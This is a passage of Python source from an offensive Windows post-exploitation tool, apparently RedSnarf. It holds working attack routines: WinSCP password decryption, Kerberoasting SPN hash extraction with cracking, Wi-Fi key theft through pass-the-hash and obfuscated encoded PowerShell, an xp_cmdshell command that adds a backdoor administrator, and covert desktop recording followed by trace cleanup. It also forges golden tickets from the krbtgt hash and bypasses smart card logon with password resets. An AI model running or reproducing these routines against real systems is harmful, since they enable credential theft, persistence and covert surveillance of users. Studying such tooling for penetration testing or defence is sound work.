				password = decrypt(scp_host.split('REG_SZ')[1].lstrip().rstrip(), scp_username.split('REG_SZ')[1].lstrip().rstrip(), scp_password.split('REG_SZ')[1].lstrip().rstrip())

				if password!="":
					print(colored("[+]Decrypted WinSCP Details are:",'green'))
					print(colored("[+]Host: "+scp_host.split('REG_SZ')[1].lstrip().rstrip(),'yellow'))
					print(colored("[+]Username: "+scp_username.split('REG_SZ')[1].lstrip().rstrip(),'yellow'))
					print(colored("[+]Password: "+password,'yellow'))

			sys.exit()

		except OSError:
				print(colored("[-]Something went wrong whilst using the WinSCP Option...",'red'))
				logging.error("[-]Something went wrong whilst using the WinSCP Option")
				sys.exit()
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine gets user SPN's from the DC so that they can be cracked with JtR or HashCat
if get_spn in yesanswers or get_spn=="l":
	if len(targets)==1:
		try:
			#Get SPN's from DC
			print(colored("[+]Trying to get SPN's from DC",'yellow'))
			logging.info("[+]Trying to get SPN's from DC")
			#Confirm that remote IP is a DC (Check port 88 Kerberos is Open)
			checkport()

			#Check that GetUserSPN's is installed
			if not os.path.isfile('/usr/local/bin/GetUserSPNs.py'):
				print(colored("[-]No GetUserSPNs.py",'red'))
				print(colored("[-]Clone from https://github.com/CoreSecurity/impacket.git",'yellow'))
				print(colored("[-]and run: python setup.py install",'yellow'))
				exit(1)
			else:
				print(colored("[+]Found GetUserSPNs.py installed",'green')

			#Check that pyasn1-0.18 is installed - (seems to be version sensitive)
			if not os.path.isfile('/usr/local/lib/python2.7/dist-packages/pyasn1-0.1.8-py2.7.egg'):
				print(colored("[-]No pyasn1-0.1.8",'red'))
				print(colored("[-]Download and install from https://pypi.python.org/pypi/pyasn1/0.1.8#downloads",'yellow'))
				print(colored("[-]and run: python setup.py install",'yellow'))
				usr_response = raw_input("\nDo you want to carry on regardless? (y/n) : ")
				if usr_response in noanswers:
					exit(1)
			else:
				print(colored("[+]Found pyasn1-0.1.8 installed",'green'))

			print(colored("[+]Configuration OK...",'yellow'))

			#Use README-jumbo as an indicator that Jtr Jumbo is installed
			proc = subprocess.Popen("locate *README-jumbo", stdout=subprocess.PIPE,shell=True)
			stdout_value = proc.communicate()[0]

			#Check to see if Jtr Jumbo is installed

			if jtr_jumbo_installed()!=None:
				print(colored("\n[+]JrR Jumbo Patch must be used to crack SPNS's and not Jtr standard",'yellow'))
				print(colored("[+]JrR Jumbo Patch installed "+jtr_jumbo_installed()+"\n",'green'))
			else:
				print(colored("\n[+]To crack the extracted hashes with JtR,",'blue'))
				print(colored("[+]JtR Jumbo Patch is needed which can be cloned from ",'blue'))
				print(colored("[+]https://github.com/magnumripper/JohnTheRipper.git",'yellow'))
				print(colored("\n[+]If building in VMWare the following will probably be needed",'blue'))
				print(colored("[+]./configure CFLAGS=\"-g -O2 -mno-avx2",'yellow'))
				print(colored("[+]make\n",'yellow'))

			#Check that a domain name has been entered
			if domain_name==".":
				print(colored("[-]You must enter a domain - e.g. ecorp.local",'red'))
				exit(1)

			#Create directory ready to save files to if it doesn't yet exist.
			if not os.path.isdir(outputpath+targets[0]):
				proc = subprocess.Popen("mkdir "+outputpath+targets[0], stdout=subprocess.PIPE,shell=True)
				stdout_value = proc.communicate()[0]

			#Check to see whether the supplied password is a hash or not
			pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
			pwdump = pwdumpmatch.match(passw)

			if pwdump:
				passw=passw[0:-3]

			if pwdump:
				proc = subprocess.Popen("GetUserSPNs.py -hashes "+passw+' '+domain_name+'/'+user+' -dc-ip '+targets[0] +" -request -outputfile "+outputpath+targets[0]+"/spns.txt", stdout=subprocess.PIPE,shell=True)
				stdout_value = proc.communicate()[0]
			else:
				proc = subprocess.Popen("GetUserSPNs.py "+domain_name+'/'+user+':'+passw+' -dc-ip '+targets[0] +" -request -outputfile "+outputpath+targets[0]+"/spns.txt", stdout=subprocess.PIPE,shell=True)
				stdout_value = proc.communicate()[0]

			#Check output to see whether SPN entries were found
			if "Type position out of range" in stdout_value:
				print(colored("[-]Type position out of range, something has gone wrong with pyasn1...",'red'))
				print(colored("[-]to fix remove pyasn1 folder from /usr/local/lib/python2.7/dist-packages/ and reinstall",'red'))
				logging.debug(stdout_value)
				sys.exit()

			#Check output to see whether SPN entries were found
			if "No entries found!" in stdout_value:
				print(colored("[-]No SPN entries were found!",'red'))
				sys.exit()

			#Confirm that SPN's have been saved properly
			if not os.path.isfile(outputpath+targets[0]+"/spns.txt"):
				logging.info(stdout_value)
				print(colored("[-]No SPNS's were output to file, check error logs",'red'))
			else:
				print(colored("[+]To parse a SPN hash file which contains multiple entries use",'blue'))
				print(colored("[+]./redsnarf.py -uSS y",'yellow'))

				logging.info("[+]SPN's output to "+outputpath+targets[0]+"/spns.txt")
				print(colored("\n[+]SPN's output to "+outputpath+targets[0]+"/spns.txt",'green'))

				#Check for any broken hashes, if a : is found Jtr will bork changing it for . solves the issue.
				#Read in hashes
				fo=open(outputpath+targets[0]+"/spns.txt","r").read()
				#Detect : in hashes, if it is found those hashes won't be detected properly
				if ":" in fo:
					print(colored("[-]We've got some corrupted hashes, replacing : for . which should fix them",'red'))
					#Replace all occurances of : with .
					fo=fo.replace(":",".")
					#Write to initial path appending .fix as not to overwrite the initial file
					file = open(outputpath+targets[0]+"/spns.txt"+".fix","w")
					file.write (fo)
					file.close()

					#Print status message
					print(colored("[+]Fixed hashe(s) and written them to "+outputpath+targets[0]+"/spns.txt"+".fix",'green'))
					logging.info("[+]Fixed hashe(s) and written them to "+outputpath+targets[0]+"/spns.txt"+".fix")

				#Check to see if Jtr Jumbo is installed
				if jtr_jumbo_installed()!=None:
					usr_response = raw_input("\nDo you want to start cracking with Jtr Jumbo? (y/n) : ")
					if usr_response in noanswers:
						exit(1)
					else:
						print(colored("[+]Sending SPN's to Jtr Jumbo",'green'))
						if os.path.isfile(outputpath+targets[0]+"/spns.txt"+".fix"):
							print(colored("[1]Detected "+outputpath+targets[0]+"/spns.txt",'yellow'))
							print(colored("[2]Detected "+outputpath+targets[0]+"/spns.txt"+".fix",'yellow'))
							usr_response = raw_input("\nPlease select which file to send to John? (1/2) : ")
							if usr_response == "1":
								quickjtrjumbo(outputpath+targets[0]+"/spns.txt",jtr_jumbo_installed())
							elif usr_response == "2":
								quickjtrjumbo(outputpath+targets[0]+"/spns.txt"+".fix",jtr_jumbo_installed())

						else:
							print(colored("[+]Detected "+outputpath+targets[0]+"/spns.txt",'yellow'))
							quickjtrjumbo(outputpath+targets[0]+"/spns.txt",jtr_jumbo_installed())
			sys.exit()

		except OSError:
			print(colored("[-]Something went wrong getting SPN's from DC",'red'))
			logging.error("[-]Something went wrong getting SPN's from DC")
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine gets Wifi Credentials from the remote machine
if wifi_credentials in yesanswers:
	if len(targets)==1:
		try:
			#Get Wifi Passwords And Network Names
			print(colored("[+]Retrieve Wifi Password",'yellow'))

			line="netsh wlan show profiles"

			en = b64encode(line.encode('UTF-16LE'))

			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			stdout_value = proc.communicate()[0]
			print(stdout_value)

			if "There is no wireless interface on the system." in stdout_value:
				sys.exit()

			response = raw_input("\nEnter the name of Wifi Profile : ")
			line="netsh wlan show profile name=\""+response+"\" key=clear"

			en = b64encode(line.encode('UTF-16LE'))

			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			stdout_value = proc.communicate()[0]
			print(stdout_value)

			sys.exit()

		except OSError:
			print(colored("[-]Something went wrong getting Wifi Details",'red'))
			logging.error("[-]Something went wrong getting Wifi Details")
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine starts a MSSQL client
if mssqlshell=="WIN" or mssqlshell=="DB":
	if len(targets)==1:
		try:
			#Check to see whether the supplied password is a hash or not
			pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
			pwdump = pwdumpmatch.match(passw)

			if pwdump:
				passw=passw[0:-3]

			print(colored("[+]Starting Impacket MSSQL Shell\n",'green'))
			print(colored("[+]Info - To manually turn on xp_cmdshell use",'green'))
			print(colored("[+]exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;",'blue'))
			print(colored("[+]exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;\n",'blue'))

			print(colored("[+]Info - To add a new user",'green'))
			print(colored("[+]xp_cmdshell 'net user redsnarf P@ssw0rd1 /add && net localgroup administrators redsnarf /add' ",'blue'))

			if mssqlshell=="WIN":
				if pwdump:
					#proc = subprocess.Popen("secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
					os.system("mssqlclient.py -hashes "+passw+' '+domain_name+"/"+user+"@"+targets[0]+" -windows-auth ")
				else:
					os.system("mssqlclient.py "+domain_name+"/"+user+":"+passw+"@"+targets[0]+" -windows-auth ")
			else:
				os.system("mssqlclient.py "+user+":"+passw+"@"+targets[0])

			sys.exit()

		except OSError:
			print(colored("[-]Something went wrong starting SQL Shell",'red'))
			logging.error("[-]Something went wrong starting SQL Shell")
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will record a remote users desktop using Windows Problem Step Recorder
if recorddesktop in yesanswers:
	if len(targets)==1:
		try:
			print(colored("[+]Starting Screen Recording:\n",'green'))

			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null")

			usr_response = raw_input("\nPlease enter the username whose desktop you wish to record : ")
			if usr_response !="":

				fout=open('/tmp/srecordstart.bat','w')
				fout.write('SchTasks /Create /SC DAILY /RU '+usr_response+' /TN "RedSnarf_ScreenRecord" /TR "psr.exe /start /gui 0 /output C:\\windows\\temp\\OUTPUT.zip" /ST 23:36 /f\n')
				fout.write('SchTasks /run /TN "RedSnarf_ScreenRecord" \n')
				fout.close()

				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put srecordstart.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\srecordstart.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

			response = raw_input("\nEnter Y to stop recording : ")
			if response in yesanswers:

				fout=open('/tmp/srecordstop.bat','w')
				fout.write('SchTasks /Create /SC DAILY /RU '+usr_response+' /TN "RedSnarf_ScreenRecordStop" /TR "psr.exe /stop" /ST 23:36 /f\n')
				fout.write('SchTasks /run /TN "RedSnarf_ScreenRecordStop" \n')
				fout.close()

				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put srecordstop.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\srecordstop.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ --directory windows/temp -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get OUTPUT.zip"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				if os.path.isfile(outputpath+targets[0]+"/"+"OUTPUT.zip"):
					print(colored("[+]Recording file saved as "+outputpath+targets[0]+"/"+"OUTPUT.zip",'yellow'))
					print(colored("[+]To view generated .mht file in Kali use Mozilla Achieve Format Addon:\n",'green'))
				else:
					print(colored("[-]Recording not found, try again..",'red'))

				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\windows\\temp\\"+"OUTPUT.zip\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\srecordstart.bat c:\\srecordstop.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				time.sleep(4)

				fout=open('/tmp/srecordtidyup.bat','w')
				fout.write('SchTasks /delete /TN "RedSnarf_ScreenRecord" /f\n')
				fout.write('SchTasks /delete /TN "RedSnarf_ScreenRecordStop" /f')
				fout.close()

				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put srecordtidyup.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\srecordtidyup.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\srecordtidyup.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				time.sleep(4)

			sys.exit()

		except OSError:
			print(colored("[-]Something went wrong recording the desktop",'red'))
			logging.error("[-]Something went wrong recording the desktop")

	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will generate golden tickets
if golden_ticket in yesanswers:
	if len(targets)==1:
		try:
			#Check to see whether the supplied password is a hash or not
			pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
			pwdump = pwdumpmatch.match(passw)

			if pwdump:
				passw=passw[0:-3]

			if os.path.isfile(outputpath+targets[0]+"/nt.txt"):
				print(colored("[+]Found file - completed : "+outputpath+targets[0]+"/nt.txt",'green'))
				print(colored("[+]Taking krbtgt hash from pre parsed hashes",'yellow'))
				if 'krbtgt' in open(outputpath+targets[0]+"/nt.txt").read():

					with open(outputpath+targets[0]+"/nt.txt",'r') as inifile:
						data=inifile.read()
						hash_list=data.splitlines()
						for k in hash_list:
							if k[0:6]=='krbtgt':
								khash=k

								kNTHASH=khash.split(':')[3] #NT Hash
								print(colored("[+]krbtgt NTLM Hash",'green'))
								print(colored(kNTHASH,'yellow'))
								break
			else:
				print(colored("[+]Pre parsed hashes not found : "+outputpath+targets[0]+"/nt.txt",'green'))
				print(colored("[+]Connecting to DC to get krbtgt hash : ",'yellow'))

				if pwdump:
					proc = subprocess.Popen("secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
				else:
					proc = subprocess.Popen("secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)

				stdout_value = proc.communicate()[0]
				krbtgt_data=stdout_value.splitlines()
				for hash_line in krbtgt_data:
					if hash_line[0:6]=='krbtgt':
						khash=hash_line
						kNTHASH=khash.split(':')[3] #NT Hash
						print(colored("[+]krbtgt NTLM Hash",'green'))
						print(colored(kNTHASH,'yellow'))
						break

			if len(kNTHASH)>0:
				#Get the SID Information
				proc = subprocess.Popen("pth-rpcclient -U "+user+"%"+passw+" "+ targets[0]+" -c \"lookupnames krbtgt\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)

				stdout_value = proc.communicate()[0]

				if not "krbtgt" in stdout_value:
					print(colored("[+]krbtgt SID NOT FOUND...",'red'))
					sys.exit()

				else:
					sid=stdout_value.split(' ')[1]
					kSID=sid[:-len(khash.split(':')[1])-1]

					print(colored("[+]krbtgt SID",'green'))
					print(colored(kSID,'yellow'))

					proc = subprocess.Popen("ticketer.py -nthash "+kNTHASH + " -domain-sid "+kSID+" -domain "+domain_name+ " -dc-ip "+ targets[0]+" administrator", stdout=subprocess.PIPE,shell=True)
					stdout_value = proc.communicate()[0]

					if "Saving ticket" in stdout_value:

						if not os.path.isdir(outputpath+targets[0]):
							proc = subprocess.Popen("mkdir "+outputpath+targets[0], stdout=subprocess.PIPE,shell=True)
							stdout_value = proc.communicate()[0]

						if os.path.isdir(outputpath+targets[0]):
							proc = subprocess.Popen("cp ./administrator.ccache "+outputpath+targets[0]+"/administrator.ccache", stdout=subprocess.PIPE,shell=True)
							stdout_value = proc.communicate()[0]

							proc = subprocess.Popen("rm ./administrator.ccache ", stdout=subprocess.PIPE,shell=True)
							stdout_value = proc.communicate()[0]

						if os.path.isfile(outputpath+targets[0]+"/administrator.ccache"):
							print(colored("[+]Ticket Created "+outputpath+targets[0]+"/administrator.ccache",'green'))
							print(colored("[+]To export - export KRB5CCNAME='"+outputpath+targets[0]+"/administrator.ccache'",'yellow'))

					else:
						print(colored("[-]Something went wrong creating Golden-Ticket...",'red'))
						logging.error("[-]Something went wrong creating Golden-Ticket")

			sys.exit()
		except OSError:
			print(colored("[-]Something went wrong creating Golden-Ticket",'red'))
			logging.error("[-]Something went wrong creating Golden-Ticket")
			sys.exit()

#Routine will display the Windows Password Policy
if password_policy in yesanswers:
	if len(targets)==1:
		try:
			if args.protocols:
				dumper = SAMRDump(args.protocols, args.username, args.password)
			else:
				dumper = SAMRDump(username=args.username, password=args.password)

			print(colored("[+]Retrieving password policy",'green'))
			dumper.dump(targets[0])
			print('\n\n')

			sys.exit()

		except OSError:
			print(colored("[-]Something went wrong checking the password policy",'red'))
			logging.error("[-]Something went wrong checking the password policy")
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will enable/disable/query the scforceoption registry value
if edq_scforceoption!='n':
	if len(targets)==1:
		try:
			if edq_scforceoption.upper()=='E':
				print(colored("\n[+]IMPORTANT - Leave SCforceoption in the state that you found it\n\n",'red'))

				print(colored("[+]Enabling SCforceoption:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Querying the status of SCforceoption:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				#Check to see if it's a DC
				scanv = subprocess.Popen(["nmap", "-sS", "-p88","--open", str(targets[0])], stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[0]
				if "open" in scanv:
					print(colored("[+]This looks to be a Domain Controller:",'green'))
					print(colored("[+]Warning - This will change the users current password:",'red'))
					response = raw_input("Would you like to turn on SmartCardLogonRequired AD Setting for an account : Y/(N) ")
					if response in yesanswers:
						response = raw_input("Please enter the account name :")
						print(colored("[+]Turning on SmardCardLogonRequired for AD Account ",'green')+colored(response,'blue'))
						line="Import-Module ActiveDirectory\n"
						line=line+"Set-ADUser "+response+" -SmartcardLogonRequired $true\n"

						en = b64encode(line.encode('UTF-16LE'))
						os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
						print(colored("[+]Task Completed for account - ",'green')+colored(response,'blue'))

				sys.exit()

			elif edq_scforceoption.upper()=='D':
				print(colored("\n[+]IMPORTANT - Leave SCforceoption in the state that you found it\n\n",'red'))

				print(colored("[+]Disabling SCforceoption:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Querying the status of SCforceoption:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				#Check to see if it's a DC
				scanv = subprocess.Popen(["nmap", "-sS", "-p88","--open", str(targets[0])], stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[0]
				if "open" in scanv:
					print(colored("[+]This looks to be a Domain Controller:",'green'))
					response = raw_input("Would you like to turn off SmartCardLogonRequired AD Setting for an account : Y/(N) ")
					if response in yesanswers:
						response = raw_input("Please enter the account name :")
						newpass = raw_input("Please enter a new password for the account :")
						print(colored("[+]Turning off SmardCardLogonRequired for AD Account ",'green')+colored(response,'blue'))
						line="Import-Module ActiveDirectory\n"
						line=line+"Set-ADUser "+response+" -SmartcardLogonRequired $false\n"
						line=line+"Set-ADAccountPassword -Reset -NewPassword (ConvertTo-SecureString -AsPlainText \""+newpass+"\" -Force) -Identity "+response+"\n"

						en = b64encode(line.encode('UTF-16LE'))
						os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
						print(colored("[+]Task Completed for account - ",'green')+colored(response,'blue'))
						print(colored("[+]Password for account ",'green')+colored(response,'blue')+colored(" has been changed to ",'green')+colored(newpass,'blue'))

				sys.exit()

			elif edq_scforceoption.upper()=='Q':
				print(colored("\n[+]INFO - Disabling this setting can be used to bypass Smart Card Logon\n\n",'red'))
				print(colored("[+]Querying the status of SCforceoption:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				sys.exit()

			else:
				print(colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red'))
				sys.exit()

		except OSError:
				print(colored("[-]Something went wrong whilst using the SCforceoption...",'red'))
				logging.error("[-]Something went wrong whilst using the SCforceoption")
				sys.exit()
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will enable/disable/query the SingleSessionPerUser registry value
if edq_SingleSessionPerUser!='n':
	if len(targets)==1:
		try:
			if edq_SingleSessionPerUser.upper()=='E':
				print(colored("\n[+]IMPORTANT - Leave SingleSessionPerUser in the state that you found it\n\n",'red'))

				print(colored("[+]Enabling SingleSessionPerUser:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Querying the status of SingleSessionPerUser:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				sys.exit()

			elif edq_SingleSessionPerUser.upper()=='D':
				print(colored("\n[+]IMPORTANT - Leave SingleSessionPerUser in the state that you found it\n\n",'red'))

				print(colored("[+]Disabling SingleSessionPerUser:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Querying the status of SingleSessionPerUser:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				sys.exit()

			elif edq_SingleSessionPerUser.upper()=='Q':
				print(colored("[+]Querying the status of SingleSessionPerUser:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fSingleSessionPerUser\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				sys.exit()

			else:
				print(colored("[-]No valid option was selected, use either e to enable, d to disable or q to query",'red'))
				sys.exit()

		except OSError:
				print(colored("[-]Something went wrong whilst using SingleSessionPerUser setting...",'red'))
				logging.error("[-]Something went wrong whilst using SingleSessionPerUser setting")
				sys.exit()
	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine will enable/disable/query the allowtgtsessionkey registry value
if edq_allowtgtsessionkey!='n':
	if len(targets)==1:
		try:
			if edq_allowtgtsessionkey.upper()=='E':
				print(colored("\n[+]IMPORTANT - Leave allowtgtsessionkey in the state that you found it\n\n",'red'))

				print(colored("[+]Enabling allowtgtsessionkey:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Querying the status of allowtgtsessionkey:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				sys.exit()

			elif edq_allowtgtsessionkey.upper()=='D':
				print(colored("\n[+]IMPORTANT - Leave allowtgtsessionkey in the state that you found it\n\n",'red'))

				print(colored("[+]Disabling allowtgtsessionkey:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Querying the status of allowtgtsessionkey:",'green'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters\" /v \"allowtgtsessionkey\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				sys.exit()

			elif edq_allowtgtsessionkey.upper()=='Q':
				print(colored("[+]Querying the status of allowtgtsessionkey:",'green'))
